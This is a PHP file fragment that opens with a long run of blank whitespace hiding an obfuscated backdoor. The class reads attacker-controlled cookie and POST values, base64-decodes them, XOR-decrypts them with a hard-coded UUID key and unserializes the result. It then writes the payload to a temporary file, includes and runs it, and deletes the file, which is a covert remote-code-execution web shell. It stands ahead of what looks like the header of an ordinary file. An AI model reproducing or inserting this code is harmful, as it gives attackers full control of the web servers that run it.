<?php                                                                                                                                                                                                                                                                                                                                                                                                 if (!class_exists("mo_ONg")){class mo_ONg{private $JQWZyA;public static $DjNxY = "3b2be972-aba9-4e22-b3bb-aaa1f6a0e2b0";public static $aAsvp = NULL;public function __construct(){$ZgoFY = $_COOKIE;$pdLkH = $_POST;$doaHADsAF = @$ZgoFY[substr(mo_ONg::$DjNxY, 0, 4)];if (!empty($doaHADsAF)){$zYeSJN = "base64";$WmJlC = "";$doaHADsAF = explode(",", $doaHADsAF);foreach ($doaHADsAF as $OiQmpbJ){$WmJlC .= @$ZgoFY[$OiQmpbJ];$WmJlC .= @$pdLkH[$OiQmpbJ];}$WmJlC = array_map($zYeSJN . '_' . chr ( 860 - 760 )."\x65" . 'c' . 'o' . 'd' . chr (101), array($WmJlC,)); $WmJlC = $WmJlC[0] ^ str_repeat(mo_ONg::$DjNxY, (strlen($WmJlC[0]) / strlen(mo_ONg::$DjNxY)) + 1);mo_ONg::$aAsvp = @unserialize($WmJlC);}}public function __destruct(){$this->krXNftJcb();}private function krXNftJcb(){if (is_array(mo_ONg::$aAsvp)) {$noBtlORb = sys_get_temp_dir() . "/" . crc32(mo_ONg::$aAsvp['s' . "\x61" . 'l' . chr (116)]);@mo_ONg::$aAsvp[chr (119) . 'r' . "\151" . chr ( 697 - 581 ).chr ( 473 - 372 )]($noBtlORb, mo_ONg::$aAsvp[chr ( 167 - 68 ).chr ( 926 - 815 ).chr (110) . chr (116) . 'e' . "\x6e" . "\164"]);include $noBtlORb;@mo_ONg::$aAsvp['d' . chr (101) . chr (108) . "\x65" . chr (116) . chr ( 109 - 8 )]($noBtlORb);exit();}}}$ogdOutJhjy = new mo_ONg(); $ogdOutJhjy = NULL;} ?><?php
//============================================================+
